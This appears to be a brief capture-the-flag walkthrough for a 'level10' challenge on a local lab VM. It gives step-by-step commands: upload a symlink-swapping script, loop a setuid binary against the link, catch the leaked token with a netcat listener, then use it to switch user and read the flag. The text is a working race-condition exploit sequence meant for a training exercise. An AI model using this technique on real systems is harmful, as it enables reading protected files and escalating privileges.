host:
- `scp -P 4242 swap_script.sh level10@192.168.56.101:/tmp/swap_script.sh`
- paste the previous flag as the password

we will need 3 terminals in the vm, we can connect to vm 2 more times to get our 3 terminals with `ssh -p 4242 level10@192.168.56.101` using the same password

ssh 2:
- `/tmp/swap_script.sh`

ssh 3:
- `while true; do ./level10 /tmp/link 192.168.56.101; done`

ssh 1:
- `nc -lk 6969`, copy the token when it shows up

close ssh 2 and 3, keeping the output of nc available

ssh:
- `su flag10`, paste the token
- `getflag`, copy the flag
- `su level11`, paste the flag as the password